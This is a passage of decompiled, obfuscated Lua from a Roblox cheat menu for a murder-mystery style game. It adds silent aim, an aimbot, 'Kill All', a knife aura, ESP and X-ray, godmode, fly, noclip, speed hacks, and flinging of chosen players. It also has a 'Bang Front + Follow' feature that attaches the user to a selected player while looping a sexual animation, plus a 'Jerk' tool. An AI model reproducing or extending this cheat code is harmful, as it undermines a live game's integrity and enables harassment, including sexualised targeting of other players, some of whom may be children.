    t3.value109 = v395:LoadAnimation(Animation)
    t3.value109.Priority = Enum.AnimationPriority.Action
    t3.value109.Looped = false
    t3.value109:Play()
end
t3.value117 = t1.value29
t3.value118 = t1.value12
function t1.value29()
    if t3.value116 then
        local RunButton = t3.value116:FindFirstChild("RunButton")

        if RunButton then
            local value108 = t3.value108
            local v399 = value108

            if value108 then
                v399 = "RUN ON"
            end

            RunButton.Text = v399 or "RUN OFF"
            RunButton.BackgroundColor3 = value108 and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(220, 40, 40)
        end
    end
end
t3.value119 = t1.value13
t3.value120 = nil
function t1.value13()
    if not t3.value114 then
        t3.value18("Dropkick", "Enable in menu first!", "Warning", nil, 2)

        return
    end

    if t3.value106 then
        return
    end

    if t3.value110 then
        t3.value110:Stop()
    end

    t3.value118()
    t3.value119()
    task.delay(2, function()
        t3.value120()

        if t3.value109 then
            t3.value109:Stop()
            t3.value109 = nil
        end
    end)
    task.spawn(function()
        for i = 3, 1, -1 do
            t3.value18("Dropkick", "Wait " .. i, "Info", nil, 1)
            task.wait(1)
        end

        t3.value18("Dropkick", "Ready", "Success", nil, 1)
    end)
end
t3.value120 = t1.value15
t3.value121 = t1.value13
t3.value122 = t1.value23
t3.value123 = t1.value29
local function v34()
    if not t3.value23 then
        return
    end

    if t3.value116 then
        t3.value116:Destroy()
        t3.value116 = nil
    end

    if not t3.value114 and not t3.value115 then
        return
    end

    t3.value116 = Instance.new("ScreenGui")
    t3.value116.Name = "DropkickMobileUI"
    t3.value116.Parent = t3.value11.PlayerGui
    t3.value116.ResetOnSpawn = false
    t3.value116.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    t3.value116.DisplayOrder = 100

    local Frame = Instance.new("Frame")

    Frame.Name = "Container"
    Frame.Size = UDim2.new(0, 170, 0, 75)
    Frame.Position = UDim2.new(1, -180, 0, 20)
    Frame.BackgroundTransparency = 1
    Frame.Parent = t3.value116

    local function v401(p53, p54, p55, p56)
        local TextButton = Instance.new("TextButton")

        TextButton.Name = p53
        TextButton.Size = UDim2.new(0, 75, 0, 75)
        TextButton.BackgroundColor3 = Color3.fromRGB(220, 40, 40)
        TextButton.Text = p54
        TextButton.Font = Enum.Font.SourceSansBold
        TextButton.TextColor3 = Color3.new(1, 1, 1)
        TextButton.TextSize = 14
        TextButton.TextWrapped = true
        TextButton.BorderSizePixel = 0
        TextButton.ZIndex = 10
        TextButton.Active = true
        Instance.new("UICorner", TextButton).CornerRadius = UDim.new(0.2, 0)
        TextButton.Parent = Frame

        if p56 then
            TextButton.MouseButton1Click:Connect(function()
                p55()
                t3.value123()
            end)

            return TextButton
        end

        TextButton.MouseButton1Click:Connect(p55)

        return TextButton
    end

    if t3.value115 then
        v401("RunButton", "RUN", function()
            t3.value122()
        end, true).Position = UDim2.new(0, 5, 0, 0)
        t3.value123()
    end

    if t3.value114 then
        local v402 = v401("DropButton", "DROP\nKICK", function()
            t3.value121()
        end, false)

        v402.Position = UDim2.new(1, -80, 0, 0)

        if t3.value115 then
            v402.Position = UDim2.new(0, 90, 0, 0)

            local RunButton = Frame:FindFirstChild("RunButton")

            if RunButton then
                RunButton.Position = UDim2.new(0, 5, 0, 0)
            end
        end
    end
end
function t1.value16(p57)
    t3.value115 = p57

    if not p57 and t3.value108 then
        t3.value108 = false

        local v405 = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")

        if v405 then
            v405.WalkSpeed = t3.value105
        end

        if t3.value111 then
            t3.value111:Disconnect()
        end

        if t3.value110 then
            t3.value110:Stop()
            t3.value110 = nil
        end
    end

    v34()
end
function t1.value11(p58)
    t3.value114 = p58

    if not p58 and t3.value109 then
        t3.value109:Stop()
        t3.value109 = nil
    end

    v34()
end
t1.value15 = Enum.KeyCode.K
t3.value124 = t1.value15
t1.value15 = Enum.KeyCode.J
t3.value125 = t1.value15
t1.value26 = _G
if t1.value26.dropkickHotkeyConn then
    _G.dropkickHotkeyConn:Disconnect()
end
t1.value26 = _G
if t1.value26.runHotkeyConn then
    _G.runHotkeyConn:Disconnect()
end
t1.value24 = _G
t1.value26 = "dropkickHotkeyConn"
t1.value23 = t3.value10.InputBegan
function t1.value14(p59, p60)
    if p60 then
        return
    end

    if p59.KeyCode == t3.value124 and t3.value114 then
        t3.value121()

        return
    end

    if p59.KeyCode == t3.value125 and t3.value115 then
        t3.value122()
    end
end
t1.value29 = t1.value23:Connect(t1.value14)
t1.value24[t1.value26] = t1.value29
t3.value11.CharacterAdded:Connect(function()
    t3.value108 = false

    if t3.value109 then
        t3.value109:Stop()
    end

    if t3.value110 then
        t3.value110:Stop()
    end

    if t3.value111 then
        t3.value111:Disconnect()
    end

    local v409 = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")

    if v409 then
        v409.WalkSpeed = t3.value105
    end

    v34()
end)
t1.value24 = _G
t1.value26 = "Dropkick"
t1.value14 = t3.value121
t1.value23 = t3.value122
function t1.value29()
    return t3.value103
end
function t1.value15(p61)
    t3.value104 = p61
end
function t1.value25()
    return t3.value124
end
function t1.value12()
    return t3.value125
end
function t1.value13(p62)
    t3.value124 = p62
end
function t1.value36(p63)
    t3.value125 = p63
end
function t1.value35()
    return t3.value108
end
function t1.value37()
    return t3.value114
end
function t1.value30()
    return t3.value115
end
t1.value18 = v34
t1.value10 = {}
local value123 = t3.value123
t1.value24[t1.value26] = {
	activate = t1.value14,
	toggleRun = t1.value23,
	getPower = t1.value29,
	setPower = function(p64)
    t3.value103 = p64
end,
	getRunSpeed = function()
    return t3.value104
end,
	setRunSpeed = t1.value15,
	getDropkickHotkey = t1.value25,
	setDropkickHotkey = t1.value13,
	getRunHotkey = t1.value12,
	setRunHotkey = t1.value36,
	isRunActive = t1.value35,
	setDropkickEnabled = t1.value11,
	setRunEnabled = t1.value16,
	isDropkickEnabled = t1.value37,
	isRunEnabled = t1.value30,
	refreshMobileButtons = t1.value18,
	updateMobileRunButton = value123
}
t3.value126 = t1.value10
t1.value10 = t3.value126
t1.value23 = "Main"
t1.value29 = t3.value24:AddTab({
	Title = "Main",
	Icon = "home"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Visuals"
t1.value29 = t3.value24:AddTab({
	Title = "Visuals",
	Icon = "eye"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Combat"
t1.value29 = t3.value24:AddTab({
	Title = "Combat",
	Icon = "crosshair"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Player"
t1.value29 = t3.value24:AddTab({
	Title = "Player",
	Icon = "user"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "AutoFarm"
t1.value29 = t3.value24
t1.value25 = {
	Title = "Farm",
	Icon = "coins"
}
t1.value29 = t1.value29:AddTab(t1.value25)
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Whitelist"
t1.value29 = t3.value24:AddTab({
	Title = "Whitelist",
	Icon = "shield"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Emotes"
t1.value29 = t3.value24:AddTab({
	Title = "Emotes",
	Icon = "smile"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Teleport"
t1.value29 = t3.value24:AddTab({
	Title = "Teleport",
	Icon = "map-pin"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Misc"
t1.value29 = t3.value24:AddTab({
	Title = "Misc",
	Icon = "wrench"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Atmosphere"
t1.value29 = t3.value24:AddTab({
	Title = "Atmosphere",
	Icon = "cloud"
})
t1.value10[t1.value23] = t1.value29
t1.value10 = t3.value126
t1.value23 = "Credits"
t1.value29 = t3.value24:AddTab({
	Title = "Credits",
	Icon = "info"
})
t1.value10[t1.value23] = t1.value29
t3.value126.Credits:AddParagraph({
	Title = "Credits",
	Content = "Made by @skittlelol1 in Discord\nthat's all.."
})
t1.value10 = t3.value126
t1.value23 = "Settings"
t1.value29 = t3.value24:AddTab({
	Title = "Settings",
	Icon = "settings"
})
t1.value10[t1.value23] = t1.value29
t1.value23 = t3.value126.Main:AddCollapsibleSection("Protection", "lucide/shield", true)
t1.value10 = t1.value23.AddToggle
function t1.value29(p65)
    t3.value60(p65)
    v32()
end
t1.value10(t1.value23, "AntiFling", {
	Title = "Anti-Fling (Enhanced)",
	Default = false,
	Callback = t1.value29
})
t1.value10 = t1.value23.AddToggle
function t1.value29(p66)
    t3.value59(p66)
    v32()
end
t1.value10(t1.value23, "AntiTrap", {
	Title = "Anti-Trap",
	Default = false,
	Callback = t1.value29
})
t1.value29 = t3.value126.Main:AddCollapsibleSection("Troll", "lucide/party-popper", true)
t3.value127 = 1.8
t3.value128 = nil
t3.value129 = false
function t1.value23()
    local value11 = t3.value11
    local v417 = value11:FindFirstChild("Backpack") or value11:WaitForChild("Backpack")

    if v417:FindFirstChild("Jerk") then
        v417.Jerk:Destroy()
    end

    local Tool = Instance.new("Tool")

    Tool.Name = "Jerk"
    Tool.RequiresHandle = false
    Tool.Parent = v417
    Tool.Equipped:Connect(function()
        t3.value129 = true

        local Character = value11.Character

        if not Character then
            return
        end

        local Humanoid = Character:FindFirstChildOfClass("Humanoid")

        if not Humanoid then
            return
        end

        local v831 = Humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", Humanoid)
        local Animation = Instance.new("Animation")

        Animation.AnimationId = "rbxassetid://698251653"
        t3.value128 = v831:LoadAnimation(Animation)
        task.spawn(function()
            while t3.value129 and t3.value128 do
                t3.value128:Play()
                t3.value128:AdjustSpeed(t3.value127)
                t3.value128.TimePosition = 0.4
                task.wait(0.1)
            end
        end)
    end)
    Tool.Unequipped:Connect(function()
        if t3.value128 then
            t3.value128:Stop()
            t3.value128 = nil
        end
    end)
    t3.value18("Jerk", "Tool added to backpack", "Success", nil, 2)
end
t1.value23 = {
	Title = "Give Jerk Tool",
	Callback = t1.value23
}
t1.value29:AddButton(t1.value23)
t1.value10 = t1.value29.AddSlider
function t1.value23(p67)
    if t3.value128 and t3.value128.IsPlaying then
        t3.value128:AdjustSpeed(p67)
    end
end
t1.value10(t1.value29, "JerkSpeedSlider", {
	Title = "Jerk Speed",
	Min = 0.5,
	Max = 5,
	Default = 1.8,
	Rounding = 0.1,
	Callback = t1.value23
})
t1.value10 = t1.value29.AddDivider
t1.value10(t1.value29)
t3.value130 = nil
t3.value131 = 1.8
t3.value132 = false
function t1.value25()
    local t36 = {}

    for _, player in ipairs(t3.value8:GetPlayers()) do
        if player ~= t3.value11 then
            table.insert(t36, player.Name)
        end
    end

    return t36
end
t3.value133 = nil
t3.value134 = nil
t3.value135 = t1.value25
t1.value13 = t3.value135()
t1.value25 = t1.value29.AddDropdown
function t1.value15(p68)
    t3.value130 = p68
end
t1.value25 = t1.value25(t1.value29, "BangTargetDropdown", {
	Title = "Select Target for Bang",
	Values = t1.value13,
	Default = "",
	Multi = false,
	Callback = t1.value15
})
t3.value136 = t1.value25
t1.value25 = t1.value29.AddButton
function t1.value15()
    local v424 = t3.value135()

    pcall(function()
        t3.value136:SetValues(v424)

        if #v424 > 0 then
            t3.value136:SetValue(v424[1])
            t3.value130 = v424[1]
        end
    end)
    t3.value18("Refresh", "Player list updated", "Info", nil, 2)
end
t1.value25(t1.value29, {
	Title = "Refresh Players",
	Callback = t1.value15
})
t1.value25 = t1.value29.AddButton
function t1.value15()
    if not t3.value130 then
        t3.value18("Error", "Select a player first!", "Error", nil, 2)

        return
    end

    local t3value130 = t3.value8:FindFirstChild(t3.value130)

    if not t3value130 or not t3value130.Character then
        t3.value18("Error", "Player not found or has no character", "Error", nil, 2)

        return
    end

    local Character = t3.value11.Character

    if not Character or not Character:FindFirstChild("HumanoidRootPart") then
        t3.value18("Error", "You don't have a character", "Error", nil, 2)

        return
    end

    if t3.value134 then
        t3.value134:Disconnect()
    end

    if t3.value133 then
        t3.value133:Stop()
    end

    t3.value132 = true
    t3.value18("Bang", "Started on " .. t3value130.Name, "Info", nil, 2)
    t3.value134 = t3.value9.Heartbeat:Connect(function()
        if not t3.value132 then
            return
        end

        local Character3 = t3value130.Character
        local Character4 = t3.value11.Character

        if Character3 and (Character4 and (Character3:FindFirstChild("HumanoidRootPart") and Character4:FindFirstChild("HumanoidRootPart"))) then
            local HumanoidRootPart = Character3.HumanoidRootPart

            Character4.HumanoidRootPart.CFrame = HumanoidRootPart.CFrame * CFrame.new(0, 0.2, 1.1)
        end
    end)

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")

    if Humanoid then
        local v428 = Humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", Humanoid)
        local Animation = Instance.new("Animation")

        Animation.AnimationId = "rbxassetid://5918726674"
        t3.value133 = v428:LoadAnimation(Animation)
        task.spawn(function()
            while t3.value132 and t3.value133 do
                t3.value133:Play()
                t3.value133:AdjustSpeed(t3.value131)
                task.wait(0.08)
            end
        end)
    end
end
t1.value25(t1.value29, {
	Title = "Bang Front + Follow",
	Callback = t1.value15
})
t1.value25 = t1.value29.AddSlider
function t1.value15(p69)
    if t3.value133 and t3.value133.IsPlaying then
        t3.value133:AdjustSpeed(p69)
    end
end
t1.value25(t1.value29, "BangSpeedSlider", {
	Title = "Bang Speed",
	Min = 0.5,
	Max = 6,
	Default = 1.8,
	Rounding = 0.1,
	Callback = t1.value15
})
t1.value25 = t1.value29.AddButton
function t1.value15()
    if t3.value134 then
        t3.value134:Disconnect()
    end

    if t3.value133 then
        t3.value133:Stop()
    end

    t3.value18("Bang", "Stopped", "Info", nil, 2)
end
t1.value25(t1.value29, {
	Title = "Stop Bang",
	Callback = t1.value15
})
t3.value126.Main:AddDivider()
t3.value126.Main:AddSection("Dropkick & Run")
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddToggle
function t1.value11(p70)
    if _G.Dropkick then
        _G.Dropkick.setDropkickEnabled(p70)
    end

    v32()
end
t1.value29(t1.value25, "DropkickToggle", {
	Title = "Dropkick (Enable)",
	Default = false,
	Callback = t1.value11
})
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddToggle
function t1.value11(p71)
    if _G.Dropkick then
        _G.Dropkick.setRunEnabled(p71)
    end

    v32()
end
t1.value29(t1.value25, "RunToggle", {
	Title = "Run (Enable)",
	Default = false,
	Callback = t1.value11
})
t3.value126.Main:AddDivider()
t1.value25 = t3.value126.Main
function t1.value24(p72)
    if _G.Dropkick then
        _G.Dropkick.setPower(p72)
    end
end
t1.value25:AddSlider("DropkickPowerSlider", {
	Title = "Dropkick Power",
	Min = 0,
	Max = 1000,
	Default = 50,
	Rounding = 0,
	Callback = t1.value24
})
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddButton
function t1.value13()
    if _G.Dropkick then
        _G.Dropkick.activate()
    end
end
t1.value29(t1.value25, {
	Title = "Activate Dropkick (K)",
	Callback = t1.value13
})
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddButton
function t1.value13()
    if not _G.Dropkick then
        return
    end
    local v434 = _G.Dropkick.getDropkickHotkey()
    t3.value18("Hotkey", "Press any key...", "Info", nil, 3)
    local connection
    connection = t3.value10.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then
            return
        end

        if input.KeyCode ~= Enum.KeyCode.Unknown then
            _G.Dropkick.setDropkickHotkey(input.KeyCode)
            pcall(function()
                for _, child in pairs(t3.value126.Main:GetChildren()) do
                    if child:IsA("TextButton") and child.Title == "Set Dropkick Hotkey (Current: " .. v434.Name .. ")" then
                        child.Title = "Set Dropkick Hotkey (Current: " .. input.KeyCode.Name .. ")"
                    end
                end
            end)
            connection:Disconnect()
            t3.value18("Hotkey", "Dropkick hotkey set to " .. input.KeyCode.Name, "Success", nil, 2)
        end
    end)
end
t1.value29(t1.value25, {
	Title = "Set Dropkick Hotkey (Current: K)",
	Callback = t1.value13
})
t3.value126.Main:AddDivider()
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddSlider
function t1.value24(p73)
    if _G.Dropkick then
        _G.Dropkick.setRunSpeed(p73)

        if _G.Dropkick.isRunActive() then
            local v437 = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")

            if v437 then
                v437.WalkSpeed = math.max(0.5, 16 * (p73 / 100))
            end
        end
    end
end
t1.value29(t1.value25, "RunSpeedSlider", {
	Title = "Run Speed %",
	Min = 0,
	Max = 500,
	Default = 20,
	Rounding = 0,
	Callback = t1.value24
})
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddButton
function t1.value13()
    if _G.Dropkick then
        _G.Dropkick.toggleRun()
    end
end
t1.value29(t1.value25, {
	Title = "Toggle Run (J)",
	Callback = t1.value13
})
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddButton
function t1.value13()
    if not _G.Dropkick then
        return
    end
    local v438 = _G.Dropkick.getRunHotkey()
    t3.value18("Hotkey", "Press any key...", "Info", nil, 3)
    local connection
    connection = t3.value10.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then
            return
        end

        if input.KeyCode ~= Enum.KeyCode.Unknown then
            _G.Dropkick.setRunHotkey(input.KeyCode)
            pcall(function()
                for _, child in pairs(t3.value126.Main:GetChildren()) do
                    if child:IsA("TextButton") and child.Title == "Set Run Hotkey (Current: " .. v438.Name .. ")" then
                        child.Title = "Set Run Hotkey (Current: " .. input.KeyCode.Name .. ")"
                    end
                end
            end)
            connection:Disconnect()
            t3.value18("Hotkey", "Run hotkey set to " .. input.KeyCode.Name, "Success", nil, 2)
        end
    end)
end
t1.value29(t1.value25, {
	Title = "Set Run Hotkey (Current: J)",
	Callback = t1.value13
})
t3.value126.Main:AddDivider()
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddSlider
function t1.value24(p74)
    if _G.Dropkick then
        _G.Dropkick.setRunSpeed(p74)

        if _G.Dropkick.isRunActive() then
            local v441 = t3.value11.Character and t3.value11.Character:FindFirstChildOfClass("Humanoid")

            if v441 then
                v441.WalkSpeed = math.max(0.5, 16 * (p74 / 100))
            end
        end
    end
end
t1.value29(t1.value25, "RunSpeedSlider", {
	Title = "Run Speed %",
	Min = 0,
	Max = 500,
	Default = 20,
	Rounding = 0,
	Callback = t1.value24
})
t1.value25 = t3.value126.Main
function t1.value13()
    if _G.Dropkick then
        _G.Dropkick.toggleRun()
    end
end
t1.value25:AddButton({
	Title = "Toggle Run (J)",
	Callback = t1.value13
})
t1.value25 = t3.value126.Main
t1.value29 = t1.value25.AddButton
function t1.value13()
    if not _G.Dropkick then
        return
    end
    local v442 = _G.Dropkick.getRunHotkey()
    t3.value18("Hotkey", "Press any key...", "Info", nil, 3)
    local connection
    connection = t3.value10.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then
            return
        end

        if input.KeyCode ~= Enum.KeyCode.Unknown then
            _G.Dropkick.setRunHotkey(input.KeyCode)
            pcall(function()
                for _, child in pairs(t3.value126.Main:GetChildren()) do
                    if child:IsA("TextButton") and child.Title == "Set Run Hotkey (Current: " .. v442.Name .. ")" then
                        child.Title = "Set Run Hotkey (Current: " .. input.KeyCode.Name .. ")"
                    end
                end
            end)
            connection:Disconnect()
            t3.value18("Hotkey", "Run hotkey set to " .. input.KeyCode.Name, "Success", nil, 2)
        end
    end)
end
t1.value29(t1.value25, {
	Title = "Set Run Hotkey (Current: J)",
	Callback = t1.value13
})
t1.value29 = t3.value126.Visuals:AddCollapsibleSection("ESP Settings", "lucide/eye", true)
t1.value25 = t1.value29.AddToggle
function t1.value11(p75)
    _G.EspEnabled = p75

    if not p75 then
        t3.value56()
    end

    v32()
end
t1.value25(t1.value29, "EspMaster", {
	Title = "Enable ESP",
	Default = false,
	Callback = t1.value11
})
t1.value25 = t1.value29.AddToggle
function t1.value11(p76)
    _G.NamesESP = p76
    v32()
end
t1.value25(t1.value29, "NamesESPToggle", {
	Title = "Player Names",
	Default = false,
	Callback = t1.value11
})
t1.value25 = t1.value29.AddToggle
function t1.value11(p77)
    _G.GunEspEnabled = p77
    v32()
end
t1.value25(t1.value29, "GunEspToggle", {
	Title = "Show Dropped Guns",
	Default = false,
	Callback = t1.value11
})
t1.value25 = t1.value29.AddToggle
function t1.value11(p78)
    _G.TrapESP = p78
    v32()

    for _, descendant in ipairs(workspace:GetDescendants()) do
        if descendant.Name == "TrapVisual" and descendant:IsA("BasePart") then
            descendant.Transparency = if not p78 then descendant:GetAttribute("OriginalTransparency") or 1 else 0

            if not p78 then
                descendant:SetAttribute("OriginalTransparency", nil)
            else
                descendant:SetAttribute("OriginalTransparency", descendant.Transparency)
            end
        end
    end
end
t1.value25(t1.value29, "TrapESPToggle", {
	Title = "Show Traps",
	Default = false,
	Callback = t1.value11
})
t1.value29 = t3.value126.Visuals:AddCollapsibleSection("Camera", "lucide/camera", true)
t1.value25 = t1.value29.AddSlider
function t1.value26(p79)
    _G.FOVValue = p79
    t3.value12.FieldOfView = p79
    v32()
end
t1.value25(t1.value29, "FOV", {
	Title = "FOV",
	Min = 30,
	Max = 120,
	Default = 70,
	Rounding = 0,
	Callback = t1.value26
})
t1.value25 = t1.value29.AddToggle
function t1.value16(p80)
    t3.value58(p80)
    v32()
end
t1.value25(t1.value29, "XrayToggle", {
	Title = "X-Ray",
	Default = false,
	Callback = t1.value16
})
t3.value126.Visuals:AddDivider()
t1.value12 = t3.value126.Visuals:AddCollapsibleSection("Visual Mods", "lucide/brush", true)
t1.value25 = t1.value12.AddToggle
function t1.value15(p81)
    t3.value82(p81)
    v32()
end
t1.value25(t1.value12, "ImproveFPS", {
	Title = "Improve FPS (Enhanced)",
	Default = false,
	Callback = t1.value15
})
t1.value25 = t1.value12.AddToggle
function t1.value15(p82)
    t3.value83(p82)
    v32()
end
t1.value25(t1.value12, "KorbloxToggle", {
	Title = "Korblox Leg",
	Default = false,
	Callback = t1.value15
})
t1.value25 = t1.value12.AddToggle
function t1.value15(p83)
    t3.value84(p83)
    v32()
end
t1.value25(t1.value12, "HeadlessToggle", {
	Title = "Headless",
	Default = false,
	Callback = t1.value15
})
t1.value12:AddButton({
	Title = "Give Boombox",
	Callback = t1.value4
})
t1.value13 = t3.value126.Combat:AddCollapsibleSection("Sheriff (Gun)", "lucide/crosshair", true)
t1.value25 = t1.value13.AddToggle
function t1.value4(p84)
    _G.SilentAimEnabled = p84
    t3.value89()
    v32()
end
t1.value25(t1.value13, "SilentAimToggle", {
	Title = "Shot Murder(PC)",
	Default = false,
	Callback = t1.value4
})
t1.value25 = t1.value13.AddKeybind
function t1.value4(p85)
    _G.SilentAimKey = p85
    t3.value89()
    v32()
end
t1.value25(t1.value13, "SilentAimKeybind", {
	Title = "Shot Murder Key",
	Default = "E",
	Callback = t1.value4
})
function t1.value4(p86)
    _G.SilentAimMobile = p86

    if p86 then
        t3.value85()
    else
        t3.value86()
    end

    v32()
end
t1.value13:AddToggle("SilentAimMobileToggle", {
	Title = "Shot Murder (Mobile button)",
	Default = false,
	Callback = t1.value4
})
t1.value25 = t1.value13.AddToggle
function t1.value4(p87)
    t3.value67(p87)
    v32()
end
t1.value25(t1.value13, "AimbotToggle", {
	Title = "Aimbot (Sheriff)",
	Default = false,
	Callback = t1.value4
})
t1.value25 = t1.value13.AddKeybind
function t1.value4(p88)
    _G.AimbotKey = p88
    v32()
end
t1.value25(t1.value13, "AimbotKeybind", {
	Title = "Aimbot Key",
	Default = "Q",
	Callback = t1.value4
})
t1.value15 = t3.value126.Combat:AddCollapsibleSection("Murderer (Knife)", "lucide/sword", true)
t1.value15:AddButton({
	Title = "Kill All",
	Callback = t1.value2
})
function t1.value2(p89)
    t3.value61(p89)
    v32()
end
t1.value15:AddToggle("KnifeAuraToggle", {
	Title = "Knife Aura",
	Default = false,
	Callback = t1.value2
})
t1.value25 = t1.value15.AddSlider
function t1.value14(p90)
    _G.KnifeAuraRange = p90
    v32()
end
t1.value25(t1.value15, "KnifeAuraRange", {
	Title = "Aura Range",
	Min = 5,
	Max = 100,
	Default = 20,
	Rounding = 0,
	Callback = t1.value14
})
function t1.value2(p91)
    _G.KnifeSilentAimEnabled = p91
    v32()
end
t1.value15:AddToggle("KnifeSilentAimPCToggle", {
	Title = "Throw Knife (PC)",
	Default = false,
	Callback = t1.value2
})
t1.value25 = t1.value15.AddKeybind
function t1.value2(p92)
    _G.KnifeSilentAimKey = p92
    v32()
end
t1.value25(t1.value15, "KnifeSilentAimPCKeybind", {
	Title = "Keybind",
	Default = "R",
	Callback = t1.value2
})
function t1.value2(p93)
    _G.KnifeMobileEnabled = p93

    if p93 then
        t3.value87()
    else
        t3.value88()
    end

    v32()
end
t1.value23 = {
	Title = "Throw Knife(Mobile button)",
	Default = false,
	Callback = t1.value2
}
t1.value15:AddToggle("KnifeSilentAimMobileToggle", t1.value23)
t1.value15:AddButton({
	Title = "Create Fake Knife",
	Callback = t1.value21
})
t3.value126.Combat:AddCollapsibleSection("General", "lucide/star", true):AddButton({
	Title = "Godmode",
	Callback = function()
    local Character = t3.value11.Character

    if not Character then
        return
    end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")

    if Humanoid then
        Humanoid.Name = "1"

        local clone = Humanoid:Clone()

        clone.Parent = Character
        clone.Name = "Humanoid"
        task.wait(0.1)
        Character["1"]:Destroy()
        t3.value12.CameraSubject = clone

        local Animate = Character:FindFirstChild("Animate")

        if Animate then
            Animate.Disabled = true
            task.wait(0.1)
            Animate.Disabled = false
        end

        t3.value18("Godmode", "Active", "Success", nil, 2)
    end
end
})
t1.value23 = t3.value126.Combat:AddCollapsibleSection("Trap", "lucide/trap", true)
t1.value15 = t3.value51()
t1.value25 = t1.value23:AddDropdown("TrapTarget", {
	Title = "Target",
	Values = t1.value15,
	Default = ""
})
t3.value137 = t1.value25
t1.value25 = t1.value23.AddButton
function t1.value2()
    local value137Value = t3.value137.Value

    if value137Value and value137Value ~= "" then
        local value137Value2 = t3.value8:FindFirstChild(value137Value)

        if value137Value2 then
            t3.value90(value137Value2)
        end
    end
end
t1.value25(t1.value23, {
	Title = "Trap Selected",
	Callback = t1.value2
})
t1.value11 = t3.value126.Player:AddCollapsibleSection("Movement", "lucide/activity", true)
t1.value25 = t1.value11.AddSlider
function t1.value29(p94)
    _G.WalkSpeed = p94
    t3.value91()
    v32()
end
t1.value25(t1.value11, "WalkSpeed", {
	Title = "Walk Speed",
	Min = 16,
	Max = 200,
	Default = 16,
	Rounding = 0,
	Callback = t1.value29
})
t1.value25 = t1.value11.AddSlider
function t1.value29(p95)
    _G.JumpPower = p95
    t3.value91()
    v32()
end
t1.value25(t1.value11, "JumpPower", {
	Title = "Jump Power",
	Min = 50,
	Max = 300,
	Default = 50,
	Rounding = 0,
	Callback = t1.value29
})
t1.value25 = t1.value11.AddToggle
function t1.value23(p96)
    _G.SpeedGlitchEnabled = p96
    v32()
end
t1.value25(t1.value11, "SpeedGlitch", {
	Title = "Speed Glitch",
	Default = false,
	Callback = t1.value23
})
t1.value25 = t1.value11.AddSlider
function t1.value29(p97)
    _G.GlitchSpeed = p97
    v32()
end
t1.value25(t1.value11, "GlitchSpeed", {
	Title = "Glitch Speed",
	Min = 16,
	Max = 300,
	Default = 35,
	Rounding = 0,
	Callback = t1.value29
})
t3.value126.Player:AddDivider()
t1.value16 = t3.value126.Player:AddCollapsibleSection("Fly & Noclip", "lucide/plane", true)
t1.value25 = t1.value16.AddToggle
function t1.value29(p98)
    t3.value92(p98)
    v32()
end
t1.value25(t1.value16, "Fly", {
	Title = "Fly",
	Default = false,
	Callback = t1.value29
})
t1.value25 = t1.value16.AddSlider
t1.value25(t1.value16, "FlySpeed", {
	Title = "Fly Speed",
	Min = 10,
	Max = 200,
	Default = 50,
	Rounding = 0,
	Callback = function(p99)
    _G.FlySpeed = p99
    v32()
end
})
t1.value25 = t1.value16.AddToggle
function t1.value29(p100)
    t3.value93(p100)
    v32()
end
t1.value25(t1.value16, "Noclip", {
	Title = "Noclip",
	Default = false,
	Callback = t1.value29
})
t3.value126.Player:AddDivider()
t1.value15 = t3.value126.Player:AddCollapsibleSection("Fling", "lucide/rocket", true)
t1.value29 = t3.value51()
t1.value25 = t1.value15:AddDropdown("FlingTarget", {
	Title = "Target",
	Values = t1.value29,
	Default = ""
})
t3.value138 = t1.value25
function t1.value23()
    local v474 = t3.value51()

    t3.value138:SetValues(v474)
    t3.value138:SetValue(nil)
    t3.value18("Refresh", "Player list updated", "Info", nil, 2)
end
t1.value15:AddButton({
	Title = "Refresh Players",
	Callback = t1.value23
})
function t1.value23()
    local value138Value = t3.value138.Value

    if not value138Value or value138Value == "" then
        t3.value18("Error", "Select a player", "Error", nil, 2)

        return
    end

    local value138Value2 = t3.value8:FindFirstChild(value138Value)

    if not value138Value2 then
        return
    end

    if t3.value52(value138Value2) then
        t3.value18("Error", "Player is whitelisted", "Error", nil, 2)

        return
    end

    task.spawn(function()
        t3.value68(value138Value2)
    end)
end
t1.value15:AddButton({
	Title = "Fling Selected (Enhanced)",
	Callback = t1.value23
})
t1.value25 = t1.value15.AddButton
function t1.value23()
    t3.value69("Murderer")
end
t1.value25(t1.value15, {
	Title = "Fling Murderer",
	Callback = t1.value23
})
t1.value25 = t1.value15.AddButton
function t1.value23()
    t3.value69("Sheriff")
end
t1.value25(t1.value15, {
	Title = "Fling Sheriff",
	Callback = t1.value23
})
t1.value25 = t1.value15.AddButton
function t1.value23()
end
t1.value25(t1.value15, {
	Title = "Stop Fling",
	Callback = t1.value23
})
t1.value25 = t1.value15.AddToggle
t1.value25(t1.value15, "ExtremeFlingToggle", {
	Title = "Touch fling",
	Default = false,
	Callback = function(p101)
